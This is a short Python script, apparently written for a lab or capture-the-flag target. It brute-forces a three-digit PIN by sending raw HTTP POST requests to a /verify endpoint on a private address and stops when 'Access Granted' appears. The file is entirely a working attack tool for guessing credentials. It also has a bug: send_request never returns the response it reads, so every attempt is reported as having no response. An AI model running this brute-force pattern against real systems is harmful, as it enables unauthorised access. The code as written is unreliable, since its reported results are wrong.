import socket

HOST = '192.168.1.10'
PORT = 8888

def create_request(pin):
    pin_str = f"{pin:03d}"
    body = f"magicNumber={pin_str}"
    headers = (
        "POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return headers + body, pin_str

def send_request(request):
    try:
        sock = socket.create_connection((HOST, PORT))
        sock.sendall(request.encode())
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
    except:
        return None

def main():
    for pin in range(1000):
        request, pin_str = create_request(pin)
        response = send_request(request)
        if response:
            decoded = response.decode(errors="ignore")
            if "Access Granted" in decoded:
                print(f"SUCCESS! PIN: {pin_str}")
                print(decoded)
                break
            else:
                print(f"Trying PIN {pin_str}")
        else:
            print(f"No response for PIN {pin_str}")

if __name__ == "__main__":
    main()
